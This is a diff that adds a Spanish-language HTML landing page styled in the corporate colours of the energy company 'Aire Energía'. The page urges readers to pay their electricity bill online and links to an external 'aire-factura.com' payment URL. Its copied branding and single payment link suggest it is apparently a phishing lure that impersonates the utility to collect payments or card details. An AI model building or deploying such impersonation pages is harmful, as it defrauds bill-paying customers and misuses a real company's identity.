@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Paga tu Factura de Energía | Aire Energía</title>
+  
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html, body {
+      height: 100%;
+      font-family: 'Arial', sans-serif;
+      background: linear-gradient(135deg, #0072ce, #00b140); /* Fondo con colores corporativos de Aire */
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      min-height: 100%;
+      padding: 20px;
+      text-align: center;
+    }
+
+    .image {
+      max-width: 90%;
+      max-height: 60vh;
+      margin-bottom: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+    }
+
+    .button-container {
+      width: 100%;
+      max-width: 500px;
+    }
+
+    .button {
+      padding: 12px 25px;
+      font-size: 18px;
+      color: white;
+      background: linear-gradient(45deg, #0072ce, #00b140);
+      border: none;
+      border-radius: 25px;
+      cursor: pointer;
+      text-decoration: none;
+      transition: transform 0.3s, box-shadow 0.3s;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: bold;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .button:hover {
+      background: linear-gradient(45deg, #00a0e3, #00c95c);
+      transform: translateY(-3px);
+    }
+
+    .icon {
+      margin-left: 10px;
+      width: 30px;
+      height: 30px;
+      animation: pulse 1.5s infinite ease-in-out;
+    }
+
+    @keyframes pulse {
+      0%, 100% {
+        transform: scale(1);
+      }
+      50% {
+        transform: scale(1.1);
+      }
+    }
+
+  </style>
+</head>
+<body>
+  
+  <div class="container">
+    <img 
+      src="factura.png" 
+      alt="Pago de factura Aire Energía" 
+      class="image"
+    >
+    <h1 style="color: #fff; margin-bottom: 20px; font-weight: bold;">
+      ¡Paga tu factura de energía fácil y rápido!
+    </h1>
+    <p style="color: #fff; margin-bottom: 40px; font-weight: bold;">
+      Evita filas y retrasos. Paga en línea desde la comodidad de tu hogar.
+    </p>
+    <a href="https://aire-factura.com/Pagar?b=eyJlbmNyeXB0ZWQiOnRydWV9" class="button">
+        Pagar factura en línea
+        <!-- Icono de rayo -->
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24">
+          <path d="M13 2L3 14h9l-1 8L21 10h-9l1-8z"/>
+        </svg>
+    </a>
+  </div>
+
+</body>
+</html>
